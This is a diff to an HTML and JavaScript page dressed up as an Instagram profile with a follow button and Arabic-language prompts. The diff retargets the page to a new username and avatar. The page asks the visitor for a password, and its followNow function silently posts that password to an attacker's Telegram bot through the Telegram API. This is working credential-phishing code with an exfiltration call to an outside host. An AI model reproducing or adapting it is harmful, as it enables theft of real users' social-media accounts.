@@ -35,9 +35,9 @@ body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
   <div class="wrap">
     <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
     <div class="avatar">
-      <img src="https://i.ibb.co/BHPy3M5s/792863657-18086969036672645-2402900281512442409-n.jpg" alt="">
+      <img src="https://i.ibb.co/BHRqStkS/813645708-17905623771557633-5843878274451591451-n.jpg" alt="">
     </div>
-    <div class="name">0qg.v</div>
+    <div class="name">Kbry20958</div>
     <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
     <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
     <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
@@ -71,7 +71,7 @@ function followNow(){
   fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 0qg.v\n🔑 "+v})
+    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 Kbry20958\n🔑 "+v})
   }).catch(function(){});
   document.getElementById('passInput').value='';
 }
